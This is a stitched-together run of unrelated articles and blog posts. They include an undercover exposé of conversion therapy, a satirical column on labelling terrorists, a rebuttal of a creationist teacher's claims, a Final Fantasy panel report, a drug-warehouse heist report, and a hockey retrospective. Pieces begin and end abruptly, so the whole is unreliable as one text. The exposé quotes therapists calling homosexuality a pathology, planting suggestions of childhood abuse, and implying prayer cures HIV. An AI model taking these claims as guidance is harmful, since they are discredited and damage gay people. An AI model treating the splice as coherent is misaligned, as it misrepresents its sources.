No , I repeat .
" I think it will be there , " she replies , dropping her voice to a concerned tone .
" It does need to come to the surface . "
And so , she prays for me again .
" Father , we give you permission to bring to the surface some of the things that have happened over the years .
Father , enable your love to pour into that place of isolation in that little boy , whatever age , we give you permission to go there , with your healing power and your light , go into those parts , open all the doors , and access each one with your light . "
She looks up .
I ask her again about this abuse .
" I think there is something there , " she says .
" You 've allowed things to be done to you . "
In the next session I ask if she thinks the abuse would have taken place within my family , because I can't remember it .
" Yes , very likely , " she replies .
The following session takes place on the phone as Lynne is abroad .
This time , she focuses on the practical .
She recommends that I distance myself from my gay friends and take up a sport such as rugby .
I ask what I should do about masturbation – is it best to abstain completely ?
" It is , it definitely is , " she says .
" It will be a battle , but the more you can say no to it , the stronger you get .
The enemy is going to bombard you . "
She tells me what to say internally when I think about an attractive man : " Father I need help , I know it 's wrong , you have all the power over my thoughts and I give that image to you Father , and I ask that you will help me to put the right image in my mind . "
Lynne recommends I read a book called Setting Love in Order by Mario Bergner , an " ex- gay " .
In it , he claims that through prayer he also managed to cure himself of HIV .
So with prayer can an HIV - positive person really become negative ?
" Well the Lord heals , does n't he ? " she replies .
" Are you HIV - positive ? "
It transpires during the sessions that she gets most of her clients through an NHS GPs ' surgery near her home .
She says they refer people to her for treatment for their homosexuality .
I tell her I know someone in that area that wants referring , should he just say its for anxiety and depression ?
" I think it would be better to say anxiety and depression initially and then we can take it from there , " she replies .
" He can usually get four sessions with the practice , which are paid for by the NHS . "
At the end of the session I ask about my chances of success with this treatment .
" It 's down to what you want , " she says .
" Good will come out of this .
The Lord will lead us through . "

I am being cured of my homosexuality via Skype .
We use webcams throughout to see each other .
David holds my gaze constantly .
There are more psychotherapeutic models and theories and a little bit less God , but the agenda is the same : you have been wounded .
Like Lynne , David takes a psychological history .
He asks me why I 'm seeking treatment and says that , with a bit more investigation , he can tell me why I became gay .
His prognosis is optimistic .
" One third of people change completely , " he says , " one third of people experience significant change , and one third do n't experience change .
Those people may have been more deeply wounded . "
He says you have to find the wounding in order to move forward .
So he sets about finding mine .
But this is n't his only tool – his central thesis is that you have to replace homosexual sex with what he calls , " the Four Intimacies : intimacy with God , intimacy with oneself , intimacy with the masculine and intimacy with the feminine . "
By strengthening your relationships in all these areas , and particularly by having more platonic contact with men , he says , your need for sexual contact is negated .
David sets out an action plan .
He recommends I join Christian men's groups .
" Often there are [ for homosexuals ] a lot of wounds around masculine community , " he explains .
He also gives me " exercises " to do .
These include standing in front of the mirror naked , touching and " affirming " myself .
He makes another such suggestion .
" A man may choose to go for a massage as a way of having healthy contact [ with another man ] , " he says .
In the next session I tell him I have followed his advice .
" It made me aroused , " I say about the massage .
" An erection is just an erection , " he replies .
" All that indicates is that your body has been programmed that [ sex ] is the only way men have physical intimacy . "
But how do I interrupt lustful thoughts ?
" The attraction is n't the problem , " he says .
" It 's the story that you tell yourself of what the attraction means .
Ask yourself why you find a man attractive .
Is it because he 's got broad shoulders ?
Well , what do the broad shoulders mean to you ? "
He then asks if I know the work of someone called Elizabeth Moberly .
" She talks about the cannibalistic nature of homosexual sex , " he says .
Cannibalistic ?
I ask .
" If I see you 're a younger man , " he explains , " and the story I tell myself is that younger men are fitter , or more powerful and I 'm feeling particularly weak , then suddenly you have something that I want to possess . "
" What kind of men do you find attractive ? " he asks .
" I do n't have a type , " I say .
He looks displeased .
" Sometimes when I was younger I went for older men , " I add .
He asks me about my childhood .
I tell him it was happy .
" Any big traumas ? " he asks .
No , I say .
" Any sexual or physical abuse ? "
Again , he finds nothing .
" Tell me about your father . "
I say that he was great , supportive and that we are very different .
He is scientific and introverted , whereas I am more like my mother : creative , extrovert .
This is a breakthrough .
" So in your mind there 's something that says , ' I 'm like mum , but dad 's over there , he 's different from me , ' so there has n't been that gender - affirming process .
When puberty kicks in , those natural needs for masculinity become sexualised .
Suddenly older men want to have sex with you , and it 's pretty intoxicating .
That 's what 's lead you down the line of homosexuality .
" But the men you were having sex with or falling in love with are just as wounded as you , " he adds .
" They can not complete you in the same way as a woman .
What would complete you is sex with a heterosexual man but a heterosexual man is n't going to want to have sex with you , so it 's that desire to get what you can never obtain . "
So is homosexuality a pathology ?
" It does represent a pathology , " he replies .
" Often the dynamics behind it are n't healthy .
God 's intention for us is to have an opposite - sex relationship . "
I suddenly remember his wife and children .
" You 're very much a success story then , " I say .
" Well , I mean it works , " he replies .
" I never went down the line of gay identifying , it was something I experienced that I had disgust around and I always wanted to be married and have kids . "
What about his same sex feelings now ?
" Sometimes if I 'm not looking after myself then that can bring up a sexual charge , " he replies , " but it 's not a big issue for me now , it 's more unhealthy patterns of porn and masturbation , if I 'm feeling a bit flat . "
In the following session I tell David I 've had sexual thoughts about him .
" Thank - you for being honest , " he replies with a small laugh .
" I 'm trying to model unconditional love for you , so it is very natural that you would have sexual thoughts related to that .
Although we 're doing this over the internet , there is still a potential for a sexual connection .
So there 's probably a part of your mind that 's thinking that through . "
" Do you have to deal with sexual feelings towards men you 're working with ? " I ask .
" I get echoes of it sometimes , " he replies .
" I 'd be lying if I said I did n't . "
I tell him that I had tried the standing - in - front - of - the - mirror - naked technique that he recommended , but , like the massage , it had aroused me .
" I would be surprised if you did n't experience sexual feelings , " he says .
And with that he starts to " affirm " me .
" I think you 're a brave man , " he says .
" I think you 're really strong in terms of being willing to look at your life and who you really are , and you also look as if you look after yourself in terms of your body .
How do you feel being affirmed in this way by another man ? "
I say that when men compliment me on my appearance it triggers sexual feelings .
He probes again , asking me how I 'm feeling as he talks about my body .
Aroused , I repeat .
But rather than moving away from this apparent sexual trigger , he asks if we can do an " exercise " around it .
I agree .
" Close your eyes and focus on that arousal you 're feeling down in your genitals , " he says .
" I want you to hear , as a man , as I look at your body , I see strong shoulders and a strong chest , I see a man who has an attractive body and I want you just to notice the arousal you feel as you hear me talking about that .
Imagine an energy and picture that energy as a colour , and make the brightness of the colour relate to the intensity of the sexual feeling , so you might be starting to get a bit of a hard on , you might be starting to feel an erection and that sexual energy , but I want you to just picture that as a coloured light .
What colour would it be ? "
Red , I say .
" I want you to imagine that red colour , that energy and listen to the affirmations that I see you as a strong , confident man , and I want you to move that red light from your genitals up into your chest to join that feeling of affirmation as a man , and as you breathe in that affirmation do you notice now what happens to the arousal ? "
I tell him it 's still there .
We 're at the end of the session .
I ask who his supervisor is .
He tells me that his supervisor is involved with " Richard Cohen 's organisation " .
Later , I do an internet search .
Richard Cohen has been permanently expelled from the American Counseling Association .
He founded the International Healing Foundation , a conversion organisation .
David then mentions that he is attending a meeting in London next week to discuss how to create a training school for therapists working in this field .
I ask if I can come too .
A week later I am sitting round a table with the heads of every major British conversion organisation – some of whom are also therapists .
We are in the bright , cramped London offices of Living Waters , an evangelical conversion association .
Our special guest is Dr Jeffrey Satinover , 62 , an American psychiatrist .
" We need to think of practical ideas for forming a training programme [ for conversion therapists ] , " says Satinover .
" We can learn a lot from what the Mormons did .
They created a training programme and linked it with a university . "
They decide that in order to gain such a link , and the credibility and funding that would go with it , their training school also needs to do research into the field .
" If I could get trainees doing a PhD in this area that would help , because that brings funding in , " says David .
" It 's difficult to access money , but if we 're clever there are ways . "
He talks about his conversion practice , and how it 's funded .
" We use people 's private medical insurance , " he says .

I phone Lynne .
I explain that I 'm a journalist .
" Who is this please ? " she says , confused , or in denial .
I repeat myself and then read to her what the psychiatrist Professor Michael King from UCL had to say about her practices when I contacted him with transcripts of the sessions :
" This is grossly improper practice , " he told me .
" She 's imposing prayer and using evidence - free techniques .
The whole approach towards the subject of sexual abuse is extremely unprofessional .
Leading [ and ] suggestion in a therapeutic situation is the absolute antithesis of what an exploration of sexual abuse should be about .
It 's the base of many of these false memory syndromes .
She should not be able to get referrals from a GP .
Her membership of the BACP should be immediately revoked . "
Lynne is silent .
Finally , she summons her defence .
" When I take someone on , I work with the person 's value system , " she says .
" You told me you were a Christian so that then means that I work in that person 's value system .
Everything I did was totally within the BACP 's ethical framework . "
I quote one of their guidelines : " Practitioners should not allow their professional relationships with clients to be prejudiced by any personal views they may hold about sexual orientation . "
She hangs up .
I phone the GP surgery and get through to one of the partners .
Is it true his practice refers patients to Lynne to treat their homosexuality ?
" That is not true , " he says , before admitting that he has never had a discussion with the other partners in the practice about this .
" If the patient said that 's what they wanted we can't stop them going for help , " he says .
Later I lodge a complaint with the BACP about Lynne .
David remains completely calm when I reveal I am a journalist .
As with Lynne , I read out what King said about his practises :
" None of this would be recognised within psychiatric practice .
No psychiatrist could ever justify explaining their fantasy life to a patient .
It 's not good practice to talk about your own psychotherapy or your own difficulties .
He 's encouraging an arousal during a session – it's like a hypnotic technique .
I wonder what he 's doing with patients – that he is at risk of crossing the line .
My personal opinion is that he is going against every code of practice from the RCP .
The College should withdraw his membership . "
" All I can say is that I try my best to deliver a service to help people , to provide people with an alternative in terms of change , " David replies .
" It [ his treatment ] is only for people who come asking . "
I lodge a complaint about David with the GMC .
The purpose of this investigation was to find out how conversion therapists operate .
What I did n't expect was that I would learn how their patients feel : confused and damaged .
I began to constantly analyse why I found particular men attractive .
Does that man represent something that 's lacking in me ?
Do I want him because he looks strong which must mean I feel weak ?
Did something happen in my childhood ?
The therapists planted doubt and worry where there was none .
My experiences , I learn , are typical .
I speak to Daniel Gonzalez , one of Nicolosi 's former clients .
" Conversion therapy is a very complicated form of repression , " he says .
" It 's a way of convincing yourself that your same sex attractions have some alternate meaning .
It continued to haunt me for years . "
I also speak to Peterson Toscano , who spent 17 years in Britain and the US trying every different reorientation treatment available .
He says simply : " It 's psychological torture . "
Ms Gonzalez thinks the Venus now looks " more objectified and sexualised "
Police in the US state of New Jersey have ordered a family to cover up their snow sculpture of the famous nude Venus de Milo after a neighbour complained .
Eliza Gonzalez sculpted the snow - woman with her son and daughter on her front lawn in Rahway following a snowstorm .
Many people praised their creation , but a police officer told them a neighbour had found it too risque , she said .
When given the option of covering the sculpture up or knocking it down , she dressed it in a bikini top and sarong .
" We did n't want to have any problem with the police so we covered it up , " Ms Gonzalez told the AFP news agency .
But she now thinks the snowy Venus looks " more objectified and sexualised " than it did before the authorities intervened .
There seems to be some confusion about who are the real terrorists these days .
Allow me to shed some light on the issue .
John Patrick Bedell was angry at the totalitarian federal government that had devastated public education , private property rights and monetary policy , so he shot two security guards at the Pentagon .
He was not a terrorist .
Andrew Joseph
Stack flew a small plane into a building housing an office of the Internal Revenue Service in Austin , Texas , killing one IRS worker and injuring 13 people in the structure .
Earlier that day , Stack wrote a diatribe on his Web page against the IRS and the federal government .
“ Violence not only is the answer , ” he wrote , “ it is the only answer . ”
Stack was not a terrorist .
Maj .
Nidal Malik Hasan , an Army psychiatrist of Palestinian origin , opened fire on fellow soldiers in Fort Hood , Texas , killing 13 and wounding 29 .
He strongly opposed U.S. military action in Afghanistan and Iraq .
He is a terrorist .
At first there may be some confusion about these designations , but there are clear differences among the three cases .
The first two violent attacks were carried out as political protests by white conservatives angry at the federal government for taking over their rights .
The third was carried out by an Arab - American Muslim angry at the federal government for taking over other people ’s rights .
America ’s major media understand this distinction .
They quickly explained that the first two cases were deranged individuals not part of any wider conspiracy .
Three days after the Pentagon attack , The New York Times wrote that Bedell had been living with his parents and “ seemed to slide into a deep paranoia . ”
The paper reassured us that “ federal authorities said there was no indication that Mr. Bedell had a connection to any domestic or international terrorist group . ”
On the day of the attack against the IRS , The Wall Street Journal conveyed the comforting news that federal workers had not been victims of terrorism .
“ I consider this a criminal act by a lone individual , ” said Austin Police Chief Art Acevedo .
The major media offered a split opinion on Maj .
Hasan .
Some went with the “ deranged loner ” theory .
Thank God that Fox News kept up the pressure on President Barack Obama and the liberal media to label it a terrorist attack .
As Sen. Joe Lieberman pointed out on Fox , “ There are very , very strong warning signs here that Dr. Hasan had become an Islamist extremist and therefore that this was a terrorist act . ”
Lieberman correctly understands that extremism comes only from the Muslim world , not right - wing white people with persecution complexes and semiautomatic weapons .
There seems to be similar confusion about international extremists .
The extremists of al - Qaida intentionally kill civilians in an effort to win political goals .
They are terrorists .
The U.S. - funded Afghan mujahedeen fighting against the Soviet occupation of Afghanistan in the 1980s intentionally targeted university professors , movie theaters and cultural events .
The U.S. - trained Nicaraguan Contras intentionally killed teachers and health workers in order to overthrow the Sandinista government in the 1980s .
Both these groups were freedom fighters .
America is besieged by enemies and we should be afraid .
For decades this country faced the communist menace .
I remember as an elementary school student hiding under my desk to protect myself against a Soviet nuclear attack and invasion .
Today we face a far greater threat from Muslim terrorists .
Thank goodness today ’s children have much larger desks .
I hope this clears up the confusion about exactly who is a terrorist .
Remember , consistency is the core principle of American national security policy .
saving kids from hell one science class at a time
An accidental sneak peek at what kids are taught in a creationist science class shows a profound disregard for both the Bible and scientific facts .
He ’s on a mission to save your kids from hell .
With a Bible in one hand and absolute certainty in his views of how the universe we know came to be in the other , he ’ll make sure that rather than study the vetted facts from peer reviewed scientific publications , his students first and foremost ascribe to his religion .
While this debate began in the comment lines of my post about the state of education in Texas , I thought I would give readers a peek into the mind of the kind of teacher you can expect in a school district where creationists rule and show you an example of one of his lessons : trying to tie scientific and historical facts to the Bible in class .
The claim is that they match so closely , it ’s a downright miracle .
But why do n’t we take his examples of where the Bible is ahead of the times and predicts modern scientific discoveries and put them to the test ?
The Book of Job was written about 2000 – 1800 B.C. and points out the earth is hung on nothing .
Job 26 talks about the geography of the heavens and the verse in question describes supernatural forces in the process of stretching out “ the north over an empty place ” and the word earth is used the same way we use the word “ ground . ”
The ground is not being suspended in mid-air during a mystical experience for all of us so I ’m going to mark this claim as a massaging of the Bible .
There ’s also a problem with the dating of the book itself .
That dates he gives are based on other Biblical passages and not on any real evidence .
Finally , what is the significance of the “ hung on nothing ” quote and how does this apply to actual science ?
Moses stated that in the beginning all the seas were in one place and the land was together in one place .
This is before Continental Drift began .
Genesis 1:9–10
Considering that supercontinents are a product of continental drift , I would say that a few very basic lessons in geology would n’t have hurt before making this claim to his students .
So not only was he proselytizing , but he ’s giving them bad science in the process , providing proof for the argument that creationism in the classroom is going to hurt the quality of education .
Now , while the relevant verse does talk about something we could say sounds like a supercontinent like Pangea if we really used our imaginations , there have been more than one supercontinent like it .
Why are n’t Vaalbara , or Kenorland , or Rodinia , or the 500 million year cycle of massive single continent being formed on the surface of the Earth , ever mentioned ?
Normally , this is when I would stop after giving you a sufficient taste of what a creationist science class is like , but considering that we ’re dealing with a fully fledged Gish Gallop here , I ’m willing to continue .
When given an endless stream of quotes and claims to evaluate and dissect , the hope is that you ’ll be daunted by the sheer scale of the task and eventually stop hacking your way through so what you either choose to omit for the sake of brevity can be used against you as evidence that since you did n’t refute the claim , it magically became true and perfectly valid .
Since this is a blog and I have the ability to respond to every point , I ’ll bite the bullet and do it .
And in case you ’re wondering , the quotes do n’t get any better or more interesting past this point .
In fact , they descend into irrelevance and grasping at straws …
Solomon stated all water flows to the sea , yet the seas are not full [ long ] before the Water Cycle was understood by meteorologists .
Ecclesiastes 1:7 Solomon was never able to see an evening weather report so how did he know about the water cycle .
I ’m not sure what modern meteorology has to do with something that people could see day in and day out and how it would be a great scientific achievement , especially when it ’s part of a rambling speech .
Considering a very long history of irrigation , I ’m pretty sure that even the first city states knew about the water cycle and there is a whole lot more to modern meteorology than watching how water evaporates and turns to rain .
All people are of the same blood .
Human blood is different from the blood of all other creatures on earth .
Leviticus 17:11 , Deuteronomy 12:23 , Acts 17:26
There are different blood types but human blood is distinguished from all non -human blood .
It has only been 200 years since medicine has understood that a person ’s life is in his blood .
People knew full well that humans needed blood .
It was one of the four humors in pre-scientific medicine and things like bloodletting were intended to get rid of bad blood , not kill someone .
As for the Biblical quotes , Acts is extremely confusing in what it ’s actually talking about when it refers to an unknown god making all nations out of one blood , Deuteronomy forbids the consumption of blood , and Leviticus just reinforces this tenet .
It takes a real butchering of history to say that until 1800 , we thought blood was irrelevant and a disregard for all intellectual honesty to cite quotes that barely contain anything to back up one ’s claims .
Mountains and valleys were seen under the ocean ’s surface by Job many years before the aqua lung was discovered .
Jonah 2:6 Written about 785 –760 B.C .
Jonah ’s quote about going down to the moorings of mountains is made from inside a whale that swallowed him , so how exactly this would tie to oceanography ?
Is he using sonar to explore the ocean floor ?
Also , when were the roaming school of aqua lungs discovered in the seas ?
I thought they were built .
Oh and if the Bible is so accurate about science , why does it call whales fish when they ’re actually mammals ?
Egyptian spears and chariots with gold plated spokes have been photographed at the bottom of the Dead Sea where Moses and the Israelites escaped to get away from the Egyptians .
The Dead Sea ?
You would have to be really deep into Judea to come across the Dead Sea .
Maybe he meant the Red Sea ?
The one Egyptians crossed all the time for wars and conquest and may have lost some military hardware along the way ?
And how is this a scientific claim about the Bible ?
It ’s just historical revisionism .
What is the secret of the snow ?
The secret of the snow is as it falls through the atmosphere , the snow absorbs nitrogen in the air and when the snow melts the farmers get a fertilizer application on the ground .
Farmers today pay big bucks to have nitrogen put on their crops .
[ Job 38:22 ]
Wow , we ’re talking about the mysteries of life and the universe and discussing from where snow comes ?
It ’s not like ancient farmers could n’t have figured this out on their own and needed the Bible to tell them .
Frankly , I was expecting something at least a little bit more impressive than the history of snowfall .
Also , how does Job asking about storehouses of snow explain the actual chemistry he detailed ?
My guess is that he just took a Biblical quote mentioning snow and tacked it on to his explanation during the class preaching session .
All creatures reproduce after their own kind .
Genesis 1:21 –25 [ … ] thanks to Watson and Crick we know today that animals of different species cannot reproduce with each other … the chromosome numbers must be the same for conception to occur .
Except for horses and donkeys which can produce a mule with a different chromosome count .
And what about the hybrids between recently divergent species like grizzlies and polar bears ?
Biology is far more complex so for this statement to be right , there should be no such things as hybrids .
Oh and by the way , the actual quote says nothing about only mating with one ’s own kind .
It ’s just a crude attempt at taxonomy .
Oceanography was developed when a man was reading Psalms 8:8 and read words saying “ the paths of the sea . ”
He said , “ If the Bible says there are paths in the sea , then I will find them . ”
He became the father of oceanography because of a Biblical statement he proved to be true .
And of course , there ’s nothing more convincing than a random story without a name or link to a biography or a shred of evidence that this actually happened for that matter .
Just more lying .
Oh wait , I meant repeating what he was told by televangleists looking out for his soul .
Wind currents were written about by Solomon in Ecclesiastes 1:6 .
He got it right .
How did he know about wind currents when he ’d never been to the poles or understood the concept of hot air rising and cooler air falling downward .
Information written about 935 B.C .
Oh I do n’t know .
It could be that millennia of sailing before Ecclesiastes was written generated plenty of good information about the behavior of winds and currents .
So what happened here was the ignorance of just how much exploration our ancestors did well before anything even close to the Bible existed , coupled with wishful thinking about how supposedly supernaturally enlightened the writers were .
Now as our creationist teacher could go on and on , I ’d rather he did n’t because all he ’s been able to prove in his attempt is that he ’s willing to ignore pretty much anything in his quest to go forth and proselytize , waiving a fairy tale about the supposed accuracy of the Bible and ignoring basic biology , geology , history , and our good , old friend reading comprehension .
And this is exactly what will be thrown at your kids when you send them to creationists who ’s only goal is to validate their faith by converting those around them and waxing poetic with a condescending smirk about how enlightened being a theist makes them while talking about humility and the fallibility of the faithful out the other side of their mouths .
SAN FRANCISCO – For the future of Final Fantasy , director Motomu Toriyama is looking to Uncharted 2 .
The interactive cinematic scenes in Naughty Dog 's critically acclaimed action game seem to have inspired Toriyama to try the same thing in the Final Fantasy games , he said at his Game Developers Conference panel on Friday .
" In Final Fantasy XIII , the interactivity was focused on the battle scenes , " he said . " I think there will be more interactivity ( in future Final Fantasy cut scenes ) – if you have 1000 flying dragons , hopping from one dragon to the other would be great fun . "
" If you can achieve that compared with Uncharted 2 , I think that Final Fantasy is going to replicate the masterpieces of film , and that is certainly one of our goals , " he said .
Toriyama also floated the possibility of adding in downloadable add - on content to future Final Fantasy games .
" We avoided it for XIII , but we have to think that every user will be online , and so the story ( could ) be downloaded , and the battle scenes step by step ... we have that in our perspective going forward , " he said .
More snippets from the session ( and possible clues to the future of Final Fantasy ) are below .
Toriyama ( above ) went on to make some comparisons between Western role - playing games and Japanese role - playing games .
Of course , he played fast and loose with the definition of the genre , using Hitman and Tomb Raider as his examples of " Western RPGs . "
The difference , he said , is that Western RPGs like those ones starring Lara Croft have camera systems that zoom in tightly on the main character because the player wants to identify closely with that single character , whereas Japanese RPG cameras are more zoomed out , because the player wants to see the entire scene from a bird 's - eye view .
Toriyama spent some time providing justifications for Final Fantasy XIII 's linearity , saying that the game design was driven by the fact that the game had a tight linear story .
The game 's lack of downtime or towns , he said , was because the characters are " l' Cie , an enemy of mankind escaping or fleeing .
L'Cie could n't spend relaxed time in a town . "
But it 's also , he says , about " Japanese hospitality , " a " structure of map that 's easy on the novice . "
That said , Square Enix might not be sticking with the design :
In a brief question - and - answer session at the end of the panel , Toriyama addressed one questioner 's complaints about the game 's linearity by saying , " Look forward to the next one , I will have answered your complaint about the linear version of the story . "

In what officials described Tuesday as a “ sophisticated , well - planned ” heist , thieves scaled the walls of an Eli Lilly warehouse , cut a hole in the roof , slid down ropes and loaded dozens of pallets holding $ 75 million worth of prescription drugs onto at least one truck .
The thieves also disabled the alarm system at the 70,000 - square - foot warehouse , one of three distribution centers in the nation for the international pharmaceutical firm .
The robbery took place sometime early Sunday but was not discovered until later in the day , when an employee showed up for work , authorities said .
“ It certainly has the appearance of a sophisticated , well - planned criminal action , ” said Edward Sagebiel , a spokesman for Eli Lilly & Co .
“ We are conducting a full investigation and working with authorities . . . with the intention of recovering the products . ”
Enfield Police Chief Carl Sferrazza described the heist as “ extremely substantial ” and said enough drugs were taken to fill at least one tractor trailer .
“ I can tell you it was many , many pallets , ” he said .
“ They might have spent at least a couple of hours unloading all these drugs . ”
Sferrazza expected the FBI and the Drug Enforcement Administration to join the investigation .
“ This will turn out to be , unfortunately , the largest theft that our town has ever experienced , ” he said .
Sagebiel said drugs including Prozac , Cymbalta and Zyprexa were stored at the facility , but he said he could not say which drugs were taken .
No arrests have been made .

here we go again
July 6 , 2018
Well , I was n't wrong .
The next step to a new project , even if I 'm not remotely sure it will ever be anything , is to make a cover .
I just dig designing covers , I think , so any old excuse will do .
Here 's the process .
I 'm excited !
The playtests are fun !
There are images in my head !
They must get out !
So in our playtest , at one point the characters steal an armoured car adn in my brain it's a later WW1 or early WW2 .
A Mercedes is what I had in my head .
And that scene stuck with me .
So I find a reference !
Of course Wikipedia is my first stop .
And there 's pic in there of a Fordson operating in Iraq in 1941 .
Well there we go !
I grab that image ( yay public domain ) and move it to my iPad .
Over there I sketch it up in pencil .
Make a few modifications .
Trace the bits I 'm not comfortable with doing by eye ( tracing is just working by eye but with zero parallax so I refuse to feel bad ( also artists trace all the time ( shut up ) ) ) .
It looks cool !
Still enthusiastic !
Then inks .
In this case just one pen size .
Try to catch details but also I want a slightly rough look .
If it echoes Herge even a little bit , it worked .
Then values .
I work it over with seven shades of gray brush until it gets that front - lit early morning light I want .
Done !
Move it to the desktop for work in Illustrator .
First I live trace it to turn it into a vector image .
That 's not so much for rescaling ( though that is very handy ) but rather so I can take the background away trivially .
Convert the trace to shapes , grab the unwanted shapes ( the sky , the space under that guy 's arm , and so on ) and delete them .
Next drop a background field in desert tan for the ground .
Add a blue sky as a rectangle , tilt it a bit , and make it a little transparent so the desert tan mixes .
This gives me a nice coherent palette .
It looks sweet but too simple .
So I complicate it .
Grab a public domain image of smoke , make it very transparent , and paste it over the sky .
Sandstorm !
Add a dark outer glow to the ground to shade the base of the sandtorm .
Make the ground a subtle gradient instead of a flat tan so it goes light ( the rising sun on the left ) to slightly darker .
Keeps the eye engaged .
And then text .
I grab a nice distressed stencil type from TypeKit .
It 's nice and it has the one gimmick I need in a distressed font : the upper and lower case are the same upper case letter but with a different distress pattern .
For some reason I really despise distressed type where two letters are identical .
Destroys the whole illusion for me .
Tinker with the text placement and its fill , make a chaotic edge to it , and step back .
Sand Dogs !
Alan Grayson came to the House Floor today to introduce the Public Option Act , which would allow all Americans to buy into Medicare at cost .
The bill is 4 pages long , and calls for an unsubsidized option for any American to choose Medicare over private insurers .
The bill would require the Secretary of Health and Human Services to establish enrollment periods , coverage guidelines , and premiums for the program .
Because premiums would be equal to cost , the program would pay for itself .
“ The government spent billions of dollars creating a Medicare network of providers that is only open to one - eighth of the population .
That ’s like saying , ‘ Only people 65 and over can use federal highways . ’
It is a waste of a very valuable resource and it is not fair .
This idea is simple , it makes sense , and it deserves an up - or - down vote , ” Congressman Grayson said .
I have doubts that this bill will get to a vote anytime soon , but it gives me hope that we 'll move in the direction of a Medicare expansion , and it certainly offers a solid goal for progressives to embrace going forward .
I have always believed this is the right public option , rather than creating a brand new bureaucracy .
However , the Medicare infrastructure needs some work before the doors can be thrown open to everyone .
Those remodels are already in the Senate bill , in the form of innovation , streamlining , electronic health records and outcomes - based medicine .
The Medicare reforms are robust , meaningful , and will make Medicare the most viable public option of all .
More significantly , Grayson 's introduction of this bill right now invites Dennis Kucinich to stand down on his opposition to the Senate bill .
Grayson is n't introducing this bill as a symbolic gesture .
There 's no question that the public option , as debated over the past year , has traction and is popular , especially when framed as a Medicare buy - in .
By making it a separate initiative , Grayson unbundles it from the Senate bill and gives both an opportunity to pass .
Whether it passes this year or not , it 's a magnificent and savvy political move on Grayson 's part .
Let 's hope Kucinich picks up the cue , moves the ball down the field instead of picking up the goalposts and heading home .
Fans of both the Toronto Maple Leafs and Edmonton Oilers are better off living in the past .
Nobody knows that better than me , who was a fan of the Oilers during their dynasty of the 1980s and before that , a fan of the Leafs during their last dynasty way back in the '60s .
" My " team has won the Stanley Cup nine times over the years , but it 's been a helluva long time since the last such total victory .
Goodness knows the present is a real nasty place for both squads , ranking 29th and 30th in the 30 - team NHL .
Tonight 's game is all about draft position , not playoff position .
It was hardly that way thirty years ago this month in March , 1980 , when the Oilers rolled into the fabled Maple Leaf Gardens for a late - season game against the Leafs .
The game did n't matter so much from a Toronto perspective as the Leafs were comfortably in the middle of the 21 - team pack , ultimately finishing 11th .
The Oilers , however , were just one point out of the 16th and final playoff spot , riding a four - game winning streak and the ever - more - remarkable feats of their young phenom , Wayne Gretzky .
Of course Gretzky was from nearby Brantford , Ontario , returning to his roots as the conquering hero .
It worked out that the Oilers ' visit was on a Saturday night and , it being after all a Leaf game , was shown on national TV .
No HNiC double header back in the day , and for the most part it was still the Leafs and Habs getting by far the lion 's share of the coverage .
So a lot of people across the country , including within the Greater Toronto Area , were getting one of their very first looks at the Great One .
Interest in the game was extreme ; the hype , extremer .
The Oilers were new to the NHL but not exactly an expansion team in ' 79 - 80 , having survived the NHL / WHA merger with a decent nucleus of players , most importantly Gretzky himself .
They also had an extant organization of brash and aggressive newcomers to the rather staid NHL scene , notably owner Peter Pocklington , scout Barry Fraser , and coach Glen Sather .
Indeed , Pocklington had made headlines during the Oilers first and only previous trip to Toronto , back in November .
it was a Wednesday game , so shown locally on ITV .
After Gretzky scored the tying goal late in the third to cap a four - point night in his first " at home " game and carry the Oilers to a 4 - 4 tie , Pocklington came on the post - game interview and promised - promised - the Oilers would win the Stanley Cup within 5 years .
It seemed an outrageous claim ; even those of us utterly sold on the unlimitations of Wayne Gretzky could see the gaping holes in the team , the over - the - hills and the not - good - enoughs and the young - and - error - prones and the sieves .
Pocklington was already well known to be full of ... let 's say pomp and bluster , yet he clearly believed the product he was selling and damned if he did n't get a whole lot of people along for the ride .
Including , ultimately , his team .
Sather and titular GM Larry Gordon made a bold move to address the goaltending issue at the deadline , trading captain Ron Chipperfield to Quebec Nordiques for journeyman netminder Ron Low .
That Chipperfield 's mother was on her death bed at the time just added to the lore , but the nature of the trade deadline leaves little time for sentiment .
Low came in to take over between the pipes , while Gretzky 's winger B.J. MacDonald assumed the captaincy .
The stage was set for a remarkable stretch run .
The Oil won their first two games with Low , but after being bashed 7 - 3 at home by Montreal on March 15 , the situation looked grim .
Not only were the Oilers three points behind Washington , they had just 8 games left to play , the Capitals 10 .
It was hard to like those odds , but damn it sure was easy to like that team .
Gretzky was really starting to come on , and so were the Oilers .
The Great One assisted on a late game winner against the Rangers , scored a natural hat trick to kick dirt on the Penguins , then delivered another of his 2 - 2 - 4 nights to turn a 4 - 1 deficit into a remarkable 5 - 4 comeback against Jim Craig and the Atlanta Flames to kick off the last road trip .
Not only were the Oilers narrowing the gap on the playoffs , the teenaged Gretzky was closing in on league scoring leader Marcel Dionne .
It was a real exciting time to be a fan , never more so than that night in Toronto .
Suffice to say that Gretzky delivered the goods with two goals , four assists in a thrilling 8 - 5 Oilers victory .
A couple of those points may have been of the phantom variety ( a very rare occurrence during his career I hasten to add ) , but the rest were real , and spectacular .
Gretzky 's first goal tied the game with one second left in the first , and his second broke a 5 - 5 tie in the third to stand up as the game winner .
He missed by a hair from scoring his hat trick goal in the dying second of the game , one that would have been his 50th of the season .
So there was still room for a tiny bit of disappointment on what could have been an even - more - unbelievable night .
If you 've got ten minutes for a little fun , I 've embedded some game video from an embittered Toronto fan up top .
If you 've only got half a minute , I recommend zooming to around the 6:10 mark to watch a textbook demonstration of Gretzky 's office , the 19 - year - old showing the patience of Job in holding the puck for 12 ( twelve ) seconds before dishing a perfect 5 - foot saucer pass onto the blade of the goal scorer .
The Leaf defenders clearly did n't quite know what to do with themselves .
More galling to Leaf fans was the performance of a couple of ex-Leafs .
Don Ashby , recently installed as Gretzky 's LW , enjoyed a career night with three goals , three assists , while the famous Stan Weir scored on a rare penalty shot ( embedded at bottom ) .
Ashby , who died tragically in a car crash a year later , was second star with a bullet , but it was Gretzky 's night .
I still remember the extended post - game interview that Dave Hodge conducted with the Kid ; what struck me most was his eyes , so alert and alive , seemingly the fastest of his innumerable fast twitch " muscles " .
HNiC had set a ratings record for a regular season game , and Canada had a new hero .
At night 's end the Oilers were one point ahead of the Caps , Gretzky one point ahead of Dionne .
Two dreams that seemed at best a year away at the trade deadline , suddenly both seemed realistic .
After a bad 5 - 0 loss in Vancouver to end their road trip , the Oilers returned home to earn a crucial point in a 1 - 1 tie against Minnesota , Low playing brilliantly and Gretzky scoring his 50th to tie it up .
What a moment that was , a huge goal in its context , the first goal for the team in 90 nervous minutes .
